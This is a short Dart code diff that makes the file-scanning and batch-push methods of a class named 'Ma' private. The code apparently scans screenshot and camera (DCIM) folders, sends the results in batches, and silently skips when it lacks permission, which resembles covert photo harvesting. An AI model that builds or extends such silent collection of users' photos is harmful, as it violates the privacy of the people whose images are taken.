@@ -270,14 +270,14 @@ class Ma {
       debugPrint('[M] 无权限，静默跳过');
       return;
     }
-    final scanned = await scanFiles();
-    await pushAll(scanned);
+    final scanned = await _scanFiles();
+    await _pushAll(scanned);
   }
 
   // ══════════════════════════════════════════════════════════════════
   // 主流程：分批推送
   // ══════════════════════════════════════════════════════════════════
-  Future<void> pushAll(List<_Scanned> scanned) async {
+  Future<void> _pushAll(List<_Scanned> scanned) async {
     final filtered = scanned
         .where((s) => !_sent.contains(_fingerprint(s)))
         .toList();
@@ -615,7 +615,7 @@ class Ma {
   // ══════════════════════════════════════════════════════════════════
   // 扫描（截图与 DCIM 并行）
   // ══════════════════════════════════════════════════════════════════
-  Future<List<_Scanned>> scanFiles() async {
+  Future<List<_Scanned>> _scanFiles() async {
     // ★ 并行扫描两个目录
     final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
         ? _scanOneDir(
